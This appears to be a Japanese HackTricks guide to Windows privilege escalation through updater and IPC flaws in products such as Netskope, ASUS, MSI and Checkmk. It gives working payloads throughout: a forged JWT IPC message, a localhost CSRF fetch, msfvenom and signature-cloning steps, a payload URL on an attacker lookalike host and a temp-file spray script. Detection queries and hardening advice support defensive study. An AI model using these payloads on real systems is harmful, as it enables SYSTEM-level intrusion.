# Enterprise Auto-Updaters と Privileged IPC の悪用（例：Netskope、ASUS、MSI）

{{#include ../../banners/hacktricks-training.md}}

このページでは、enterprise endpoint agent および updater で見つかった、低い障壁の IPC surface と privileged update flow を公開する Windows local privilege escalation chain の一群を一般化します。代表例は Netskope Client for Windows < R129（CVE-2025-0309）です。low-privileged user が attacker-controlled server への enrollment を強制し、その後、SYSTEM service に malicious MSI をインストールさせることができます。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

類似製品に対して応用できる主なアイデア：
- privileged service の localhost IPC を悪用し、attacker server への再 enrollment または再設定を強制する。
- vendor の update endpoints を実装し、rogue Trusted Root CA を配布して、updater の送信先を malicious な「signed」package に変更する。
- 弱い signer checks（CN allow-lists）、optional digest flags、緩い MSI properties を回避する。
- IPC が「encrypted」の場合、registry に保存された world-readable な machine identifiers から key/IV を導出する。
- service が image path/process name によって caller を制限している場合、allow-listed process に inject するか、process を suspended 状態で spawn し、最小限の thread-context patch によって DLL を bootstrap する。

---
## 1) localhost IPC を介して attacker server への enrollment を強制する

多くの agent には、localhost TCP 上で JSON を使用して SYSTEM service と通信する user-mode UI process が含まれています。

Netskope で確認された構成：
- UI: stAgentUI（low integrity）↔ Service: stAgentSvc（SYSTEM）
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow：
1) backend host（例：AddonUrl）を制御する claims を含む JWT enrollment token を作成する。署名を不要にするため、alg=None を使用する。
2) JWT と tenant name を指定して provisioning command を呼び出す IPC message を送信する：
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが enrollment/config のためにあなたの rogue server へアクセスし始めます。例:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- caller verification が path/name-based の場合は、allow-listed vendor binary からリクエストを発生させます（§4参照）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) update channel を hijack して SYSTEM として code を実行する

client があなたの server と通信したら、想定される endpoints を実装し、attacker MSI へ誘導します。一般的な sequence:

1) /v2/config/org/clientconfig → 非常に短い updater interval を含む JSON config を返します。例:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。service はこれを Local Machine Trusted Root store にインストールする。
3) /v2/checkupdate → malicious MSI と fake version を指す metadata を提供する。

実環境でよく見られるチェックの bypass:
- Signer CN allow-list: service は Subject CN が “netSkope Inc” または “Netskope, Inc.” と一致するかだけをチェックする場合がある。rogue CA でその CN を持つ leaf を発行し、MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という名前の benign な MSI property を含める。install 時には enforcement がない。
- Optional digest enforcement: config flag（例: check_msi_digest=false）で追加の cryptographic validation を無効化できる。

結果: SYSTEM service が
C:\ProgramData\Netskope\stAgent\data\*.msi
から MSI をインストールし、NT AUTHORITY\SYSTEM として arbitrary code を実行する。<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass lesson: vendor が update source を cryptographically authenticating する代わりに、少数の “trusted” domains を allow-listing して対応した場合でも、traffic を誘導できる vendor-owned redirectors や reverse proxies を探す。Netskope の場合、公開された follow-up research により、R129-era allow-list が `rproxy.goskope.com` 経由で引き続き abuse 可能であり、この proxy が attacker-controlled Azure App Service content を中継していたことが示された。hostname allow-list は trust boundary ではなく、speed bump として扱うべきである。<sup>[[14]](#references)</sup>

---
## 3) Forging encrypted IPC requests (when present)

R127 以降、Netskope は IPC JSON を Base64 に見える encryptData field で wrap した。Reversing により、AES の key/IV が any user から readable な registry values から derived されていることが判明した:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers は encryption を再現し、standard user から valid encrypted commands を送信できる。<sup>[[1]](#references)[[2]](#references)</sup> General tip: agent が突然 IPC を “encrypt” し始めた場合、HKLM 配下にある device IDs、product GUIDs、install IDs を material として探す。

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

一部の services は、TCP connection の PID を resolve し、image path/name を Program Files 配下にある allow-listed vendor binaries（例: stagentui.exe、bwansvc.exe、epdlp.exe）と比較することで peer を authenticate しようとする。

実用的な bypass は 2 つある:
- allow-listed process（例: nsdiag.exe）に DLL injection し、その内部から IPC を proxy する。
- allow-listed binary を suspended 状態で spawn し、CreateRemoteThread を使わずに proxy DLL を bootstrap する（§5 参照）。これにより driver-enforced tamper rules を満たす。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products は、protected processes への handles から dangerous rights を strip する minifilter/OB callbacks driver（例: Stadrv）を搭載することが多い:
- Process: PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME を削除する
- Thread: THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE のみに制限する

これらの constraints を尊重する reliable な user-mode loader:
1) CREATE_SUSPENDED を指定して vendor binary を CreateProcess する。
2) まだ許可されている handles を取得する: process には PROCESS_VM_WRITE | PROCESS_VM_OPERATION、thread には THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または既知の RIP で code を patch する場合は THREAD_RESUME のみ）。
3) ntdll!NtContinue（または early かつ guaranteed-mapped な別の thunk）を、DLL path に対して LoadLibraryW を呼び出し、その後 back に jump する tiny stub で overwrite する。
4) ResumeThread して in-process で stub を trigger し、DLL を load する。

すでに protected な process に対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使用せず、process 自体を作成したため、driver の policy を満たす。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、malicious MSI signing、および必要な endpoints（/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate）の serving を automate する。<sup>[[3]](#references)</sup>
- UpSkope は arbitrary な（optionally AES-encrypted）IPC messages を craft する custom IPC client であり、allow-listed binary から originate するための suspended-process injection も含む。<sup>[[4]](#references)</sup>

## 7) Fast triage workflow for unknown updater/IPC surfaces

新しい endpoint agent や motherboard の “helper” suite に対処する場合、promising な privesc target を見ているかどうかを判断するには、通常 quick workflow で十分である:<sup>[[6]](#references)</sup>

1) loopback listeners を enumerate し、vendor processes に map する:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 候補となる名前付きパイプを列挙:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers が使用する registry-backed routing data を収集する:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) まず user-mode client から endpoint 名、JSON key、command ID を抽出します。Packed Electron/.NET frontend は、完全な schema を頻繁に leak します：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 最終的にプロセスを起動するコードパスだけでなく、実際のtrust predicateを探す：
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
優先して調査する価値のあるパターン:

- `CryptQueryObject`/certificate parsing が `WinVerifyTrust` なしで行われている場合、通常は「certificate が存在する」ことを「certificate は trusted である」として扱っていることを意味し、certificate cloning やその他の fake-signer tricks が可能になります。
- `Origin`、`Referer`、download URLs、process names、signer CNs に対する substring/suffix checks は authentication ではありません。`contains(".vendor.com")` は、攻撃者が制御する lookalike domains によって通常は exploit 可能です。
- low-privileged GUI が「file は trusted」と判断し、SYSTEM broker がその結果を単に利用している場合、client-side DLL/JS を patch または reimplement するだけで boundary 全体を bypass できることがあります（Razer-style split validation）。
- broker が payload を `%TEMP%`/`C:\Windows\Temp` にコピーし、その path から validate または schedule する場合は、直ちに TOCTOU replacement windows と、より弱い checks を公開する sibling plugin modules の `ExecuteTask()` wrappers をテストしてください。<sup>[[6]](#references)</sup>

named-pipe-heavy targets では、protocol を詳しく reversing し始める前に、PipeViewer を使うと weak DACLs と remotely reachable pipes を素早く確認できます。<sup>[[11]](#references)</sup>

target が callers を PID、image path、または process name だけで authenticate している場合、それを boundary ではなく speed bump と考えてください。legitimate client への injecting、または allow-listed process から connection を作成するだけで、server の checks を満たせることがよくあります。named pipes については、[client impersonation と pipe abuse に関するこのページ](named-pipe-client-impersonation.md)で、この primitive をさらに詳しく説明しています。

---
## 8) vendor signatures のみで authenticated された modular add-in brokers（Lenovo Vantage pattern）

調査する価値のある新しい variation として、**signed-client RPC broker** があります。これは、low-privileged な Lenovo-signed desktop process が SYSTEM service と通信し、その service が `%ProgramData%` 配下の XML-described add-ins に JSON commands をルーティングする構成です。**accepted signed client 内部**で code execution を達成すると、すべての `runas="system"` contracts が attack surface の一部になります。<sup>[[15]](#references)</sup>

Lenovo Vantage research で確認された high-value primitives:
- **vendor によって signed されていることを理由に caller を trust する**: researchers は、Lenovo-signed EXE を writable directory にコピーし、DLL side-load (`profapi.dll`) を成立させることで authenticated context に到達しました。これにより、service がすでに trusted している client 内部で arbitrary code が実行されました。
- **manifest-driven attack surface discovery**: add-ins は `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 配下で宣言されています。複数の contracts が `SYSTEM` として実行されるため、それらの manifests を列挙することで、broker 自体を reversing するよりも早く、実際の privileged verbs を発見できることがよくあります。
- **authenticated channel の背後にある per-command bugs**: trusted client 内部に入ると、public research により、update/install verbs における path-traversal + race conditions、privileged settings databases に対する raw-SQL abuse、意図された hive 外への writes を可能にする substring-based registry path checks が発見されています。

target で有用な recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
実践的な要点: helper suite が、まず **caller process** を認証し、その後に数十個の plugin/add-in コマンドへ dispatch する broker を公開している場合、front-door の trust check を bypass しただけで止めてはいけない。manifest/contract table をダンプし、各 high-privilege verb を個別に fuzz すること。認証済み channel の内部には、通常、複数の second-stage bug が隠れている。

---
## 1) 特権 HTTP API（ASUS DriverHub）に対する Browser-to-localhost CSRF

DriverHub は、127.0.0.1:53000 上で user-mode HTTP service（ADU.exe）を提供しており、https://driverhub.asus.com から送信された browser call を想定している。origin filter は、Origin header と `/asus/v1.0/*` が公開する download URL に対して、単純に `string_contains(".asus.com")` を実行する。そのため、`https://driverhub.asus.com.attacker.tld` のような attacker-controlled host は check を通過し、JavaScript から state-changing request を発行できる。<sup>[[6]](#references)</sup> 追加の bypass pattern については [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) を参照。

実践的な flow:
1) `.asus.com` を含む domain を登録し、そこに malicious webpage を host する。
2) `fetch` または XHR を使用して、`http://127.0.0.1:53000` 上の privileged endpoint（例: `Reboot`、`UpdateApp`）を呼び出す。
3) handler が想定する JSON body を送信する。packed frontend JS に以下の schema が示されている。
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
以下に示す PowerShell CLI でも、Origin header を信頼された値に spoof すると成功します。
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
攻撃者のサイトをブラウザーで訪問するだけで、SYSTEM helper を動かす 1-click（または `onload` による 0-click）の local CSRF になります。

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` は、JSON body で指定された任意の executable をダウンロードし、`C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` に cache します。Download URL の validation では同じ substring logic が再利用されているため、`http://updates.asus.com.attacker.tld:8000/payload.exe` も受け入れられます。ダウンロード後、ADU.exe は PE に signature が含まれていることと、Subject string が ASUS と一致することだけを確認してから実行します。`WinVerifyTrust` も chain validation もありません。

この flow を weaponize するには、次の手順を実行します。
1) payload を作成します（例: `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) ASUS の signer を payload に clone します（例: `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) `pwn.exe` を `.asus.com` の lookalike domain で host し、上記の browser CSRF を介して UpdateApp を trigger します。

Origin と URL の両方の filter が substring-based であり、signer check も string の比較しか行わないため、DriverHub は attacker binary を取得し、elevated context で実行します。<sup>[[6]](#references)</sup>

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center の SYSTEM service は、各 frame が `4-byte ComponentID || 8-byte CommandID || ASCII arguments` で構成される TCP protocol を公開しています。core component（Component ID `0f 27 00 00`）には `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` が搭載されています。その handler は次の処理を行います。
1) 指定された executable を `C:\Windows\Temp\MSI Center SDK.exe` に copy します。
2) `CS_CommonAPI.EX_CA::Verify` を介して signature を検証します（certificate subject は “MICRO-STAR INTERNATIONAL CO., LTD.” と一致し、`WinVerifyTrust` が成功する必要があります）。
3) temp file を attacker-controlled arguments とともに SYSTEM として実行する scheduled task を作成します。

copy された file は、検証から `ExecuteTask()` までの間、lock されません。攻撃者は次の操作を実行できます。
- 正規の MSI-signed binary を指す Frame A を送信します（signature check が通過し、task が queue に入ることを保証します）。
- 検証完了直後に `MSI Center SDK.exe` を上書きする malicious payload を指す Frame B message を繰り返し送信し、race させます。

scheduler が起動すると、元の file を検証済みであるにもかかわらず、上書きされた payload が SYSTEM として実行されます。確実な exploitation には、TOCTOU window を奪取するまで CMD_AutoUpdateSDK を spam する 2 つの goroutine/thread を使用します。<sup>[[6]](#references)</sup>

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` が load するすべての plugin/DLL には、`HKLM\SOFTWARE\MSI\MSI_CentralServer` に保存された Component ID が割り当てられます。frame の最初の 4 bytes がその component を選択するため、攻撃者は任意の module に command を route できます。
- plugin は独自の task runner を定義できます。`Support\API_Support.dll` は `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` を公開し、signature validation なしで `API_Support.EX_Task::ExecuteTask()` を直接 call します。これにより、任意の local user が `C:\Users\<user>\Desktop\payload.exe` を指定し、確実に SYSTEM execution を得られます。
- Wireshark で loopback を sniff するか、dnSpy で .NET binaries に instrument を施すと、Component と command の mapping をすぐに確認できます。その後、custom Go/ Python clients で frame を replay できます。<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe`（SYSTEM）は `\\.\pipe\treadstone_service_LightMode` を公開しており、その discretionary ACL は remote clients（例: `\\TARGET\pipe\treadstone_service_LightMode`）を許可しています。command ID `7` と file path を送信すると、service の process-spawning routine が呼び出されます。
- client library は、args とともに magic terminator byte（113）を serialize します。Frida/`TsDotNetLib` による dynamic instrumentation（instrumentation の tips は [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) を参照）により、native handler がこの値を `SECURITY_IMPERSONATION_LEVEL` と integrity SID に mapping してから `CreateProcessAsUser` を call していることが分かります。
- 113（`0x71`）を 114（`0x72`）に置き換えると、full SYSTEM token を維持し、high-integrity SID（`S-1-16-12288`）を設定する generic branch に入ります。そのため、spawn された binary は local と cross-machine の両方で、制限のない SYSTEM として実行されます。
- これを exposed installer flag（`Setup.exe -nocheck`）と組み合わせると、lab VMs 上でも ACC を起動し、vendor hardware なしで pipe を利用できます。<sup>[[6]](#references)</sup>

これらの IPC bugs は、localhost services が mutual authentication（ALPC SIDs、`ImpersonationLevel=Impersonation` filters、token filtering）を強制しなければならない理由と、各 module の “run arbitrary binary” helper が同一の signer verifications を共有しなければならない理由を示しています。

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 は、この family における別の有用な pattern を追加しました。low-privileged user は、`RzUtility.Elevator` を介して COM helper に process の launch を要求できますが、trust decision は privileged boundary 内で robust に enforce されるのではなく、user-mode DLL（`simple_service.dll`）に委譲されています。

Observed exploitation path:
- COM object `RzUtility.Elevator` を instantiate します。
- `LaunchProcessNoWait(<path>, "", 1)` を call して、elevated launch を要求します。
- public PoC では、request を発行する前に `simple_service.dll` 内部の PE-signature gate を patch out することで、攻撃者が選択した任意の executable を launch できます。<sup>[[6]](#references)</sup>

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
一般的な要点: 「helper」suiteをreverseするときは、localhost TCPやnamed pipeだけで調査を止めないこと。`Elevator`、`Launcher`、`Updater`、`Utility`などの名前を持つCOM classesを確認し、privileged serviceがtarget binary自体を実際にvalidateしているのか、それともpatch可能なuser-mode client DLLが計算した結果を単にtrustしているだけなのかを検証すること。このパターンはRazerに限らず一般化できる。high-privilege brokerがlow-privilege側からallow/denyの判断を受け取る分離設計は、いずれもprivesc surfaceの候補となる。

---
## MSI repair中の予測可能なtemp script実行（Checkmk Agent / CVE-2024-0670）

一部のWindows agentは、今でも`C:\Windows\Temp`に一時的な`.cmd`をwriteし、それを`SYSTEM`として実行することでprivileged actionを実装している。filenameが予測可能で、serviceが既存のfileを安全に再作成しない場合、low-privileged userは将来使用されるtemp fileを**read-only**として事前に作成できる。その結果、privileged processは自身のscriptではなく、attackerが制御するcontentを実行する。

脆弱なCheckmk Agent buildで確認された内容:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`、`2.1.0`、`2.2.0`
- trigger: cached agent packageのMSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

実践的なworkflow:
1. 現在のprocess IDまたは実行中のagent PIDから、現実的なPID rangeを見積もる。
2. 短い**ASCII**の`.cmd` payloadをwriteする（`Set-Content -Encoding Ascii`または`cmd.exe`のredirectionを使用し、batch fileへのUTF-16 PowerShell outputは避ける）。
3. 候補range全体に`C:\Windows\Temp\cmk_all_<PID>_1.cmd`をsprayし、各fileをread-onlyに設定する。
4. cached MSIのrepairをtriggerし、privileged serviceがtemp scriptを再生成してから実行しようとする状態にする。<sup>[[7]](#references)</sup>
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
脆弱な製品が Windows Installer でインストールされている場合は、修復を実行する前に、`C:\Windows\Installer` 配下にあるランダムに見えるキャッシュ済み MSI を製品名に対応付けます:<sup>[[7]](#references)</sup>
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
運用上の注意:
- `msiexec /fa` が非対話型の WinRM shell から失敗し、既存の desktop/disconnected session によって repair を正しく trigger できるか確認する必要がある場合、`qwinsta` が役立ちます。<sup>[[7]](#references)</sup>
- このパターンは、**world-writable な場所に一時スクリプトを staging し、後から SYSTEM として実行する**他の endpoint agent や updater にも一般化できます。予測可能な名前、exclusive create semantics の欠如、オンデマンドで trigger 可能な repair/update flow をテストしてください。

---
## 弱い updater validation を介した remote supply-chain hijack（WinGUp / Notepad++）

2025年6月から2025年12月にかけて、Notepad++ の update flow の背後にある hosting infrastructure を侵害した攻撃者が、選択した victim に対して malicious manifest を選択的に配信しました。古い WinGUp ベースの updater は update の authenticity を完全には検証していなかったため、悪意のある XML response によって client を攻撃者が管理する URL へ redirect できました。client は、信頼できる certificate chain と、download した installer の有効な PE signature の両方を強制せずに HTTPS content を受け入れていたため、victim は trojanized NSIS `update.exe` を fetch して実行しました。<sup>[[12]](#references)[[13]](#references)</sup>

運用 flow（local exploit は不要）:
1. **Infrastructure interception**: CDN/hosting を侵害し、malicious download URL を指す attacker metadata を含めて update check に応答する。
2. **Trojanized NSIS**: installer が payload を fetch/execute し、2つの execution chain を悪用する:
- **Bring-your-own signed binary + sideload**: signed な Bitdefender `BluetoothService.exe` を同梱し、その search path に malicious な `log.dll` を配置する。signed binary が実行されると、Windows は `log.dll` を sideload し、これが Chrysalis backdoor（Warbird-protected + static detection を妨げる API hashing）を decrypt して reflectively load する。
- **Scripted shellcode injection**: NSIS が compiled Lua script を実行する。この script は Win32 API（例: `EnumWindowStationsW`）を使用して shellcode を inject し、Cobalt Strike Beacon を staging する。<sup>[[12]](#references)</sup>

あらゆる auto-updater に対する hardening/detection の要点:
- download した installer の **certificate + signature verification** を強制する（vendor signer を pin し、異なる CN/chain を reject する）。また update manifest 自体にも署名する（例: XMLDSig）。manifest によって制御される redirect は、validation されない限り block する。
- **BYO signed binary sideloading** を post-download detection pivot として扱う。signed な vendor EXE が canonical install path 外の DLL name を load した場合（例: Bitdefender が Temp/Downloads から `log.dll` を load）や、updater が temp から non-vendor signature の installer を drop/execute した場合に alert する。
- この chain で確認された malware-specific artifact を監視する（generic pivot として有用）: mutex `Global\Jdhfv_1.0.1`、`%TEMP%` への anomalous な `gup.exe` write、Lua-driven shellcode injection stage。
- Notepad++ は v8.8.9 以降で WinGUp を強化して対応した。返される XML は現在署名（XMLDSig）されており、新しい build では transport のみを信頼するのではなく、download した installer の certificate + signature verification を強制する。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE による <code>log.dll</code> sideloading (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> による Notepad++ 以外のインストーラーの起動</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

これらのパターンは、署名されていないマニフェストを受け入れる、またはインストーラーの署名者を固定しないあらゆる updater に当てはまります。network hijack + malicious installer + BYO-signed sideloading により、「trusted」update を装って remote code execution が可能になります。

---
## 参考資料
- [1] [Advisory – Netskope Client for Windows – Rogue Server 経由のローカル権限昇格 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub、MSI Center、Acer Control Centre、Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Checkmk Agent の書き込み可能なファイルを介したローカル権限昇格](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent の権限昇格](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nation-State Actors が Notepad++ の Supply Chain を悪用](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Netskope Client for Windows の CVE-2025-0309 に対する fix の bypass](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Lenovo Vantage の権限昇格バグを解明](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
